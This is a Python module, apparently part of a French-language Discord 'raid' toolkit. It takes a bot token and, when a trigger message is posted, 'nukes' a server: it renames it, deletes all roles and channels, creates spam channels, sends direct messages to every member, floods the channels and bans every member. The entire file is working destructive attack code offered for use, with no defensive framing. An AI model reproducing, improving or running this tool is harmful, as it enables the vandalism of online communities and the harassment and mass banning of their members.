from assets.plugin.common.base import *

def raid_bot():
    
    rpc("Raid bot")
    bot = discord.Client()

    clear()
    raidbot_banner()
    token = input(f"{y}[{w}#{y}]{w}Entrez le token du bot:\n>>> ")
 
    clear()
    raidbot_banner()
    sname = input(f"{y}[{w}#{y}]{w}Entre le nom que tu veux donner au serveur:\n>>> ")

    clear()
    raidbot_banner()
    cmd = input(f"{y}[{w}#{y}]{w}Entre la commande que tu veux utiliser pour demarrer le bot:\n>>> ")

    clear()
    raidbot_banner()
    spam = input(f"{y}[{w}#{y}]{w}Entre le message que tu veux envoyer dans le serveur:\n>>> ")

    clear()
    raidbot_banner()
    nb_spam = input(f"{y}[{w}#{y}]{w}Enter le nombre de de message que tu veux envoyer dans le serveur:\n>>> ")

    clear()
    raidbot_banner()
    mp = input(f"{y}[{w}#{y}]{w}Entre le message que tu veux envoyer en MP:\n>>> ")
    
    clear()
    raidbot_banner()
    ch_name = input(f"{y}[{w}#{y}]{w}Entre le nom des channels que tu veux creer (sans maj):\n>>> ")
    
    clear()
    raidbot_banner()
    ch_num = input(f"{y}[{w}#{y}]{w}Entre le nombre de channel que tu veux creer:\n>>> ")


    def spam_member() :
        return f"""{mp}"""

    async def delete_all_channels(guild):
        for channel in guild.channels:
            try:
                await channel.delete()
            except:
                pass


    async def delete_all_roles(guild):
        for role in guild.roles:
            try:
                if role.name != "@everyone":
                    await role.delete()
            except:
                pass

    async def spam_members(guild):
        for member in guild.members:
            try:
                await member.send(spam_member(member.name))
            except:
                pass

    async def ban_all_members(guild):
        for member in guild.members:
            try:
                await member.ban()
            except:
                pass

    async def create_text_channels(guild):
        for _ in range(int(ch_num)):
            try:
                await guild.create_text_channel(name=ch_name)
            except:
                pass

    async def spam_in_channels(guild):
        for _ in range(int(nb_spam)):
            try:
                for i in guild.channels:
                    if str(i.type) != "voice":
                        await i.send(spam)
            except:
                pass
            
    async def nuke(guild):
        clear()
        raidbot_banner()
        print(f"{y}[{w}#{y}]{w}Execution de la commande en cours..")
        try:
            await guild.edit(name=sname)
            await guild.edit(icon=None)
            print(f"{y}[{w}#{y}]{w}Nom et icon du serveur changés avec succès !")
        except:
            error("Erreur lors du changement des infos du serveur !")
        try:
            await delete_all_roles(guild)
            print(f"{y}[{w}#{y}]{w}L'integralité des roles ont été supprimés !")
        except:
            error("Erreur lors de la suppresion des roles !")

        try:
            await delete_all_channels(guild)
            print(f"{y}[{w}#{y}]{w}L'integralité des channels ont été supprimés !")
        except:
            error("Erreur lors de la suppresion des channels !")
        try:
            await create_text_channels(guild)
            print(f"{y}[{w}#{y}]{w}L'integralité des channels ont été crées !")
        except:
            error("Erreur lors de la creation des channels !")
        try:
            await spam_members(guild)
            print(f"{y}[{w}#{y}]{w}L'integralité des membres ont été spammés !")
        except:
            error("Erreur lors du spam des membres !")
        try:
            await spam_in_channels(guild)
            print(f"{y}[{w}#{y}]{w}L'integralité des channels ont reçu du spam !")
        except:
            error("Erreur lors du spam dans les channels !")
        try:
            await ban_all_members(guild)
            print(f"{y}[{w}#{y}]{w}L'integralité des membres ont été bannis !")
        except:
            error("Erreur lors du banissement des membres !")
        print(f"{y}[{w}#{y}]{w}Raid terminé avec succès !...")
        print(f"\n{y}[{w}#{y}]{w}Le bot est pret !...")

            
        
    #Bot 
    bot = discord.Client()

    #Bot ready & presence
    @bot.event
    async def on_ready():
        clear()
        raidbot_banner()
        print(f"{y}[{w}#{y}]{w}Le bot est pret !")

    #Bot command 
    @bot.event
    async def on_message(message):
        guild = message.guild
        if message.content == cmd:
            try:
                await nuke(guild)
            except:
                error("Le bot n'a pas pas les permissions requises !")
    bot.run(token)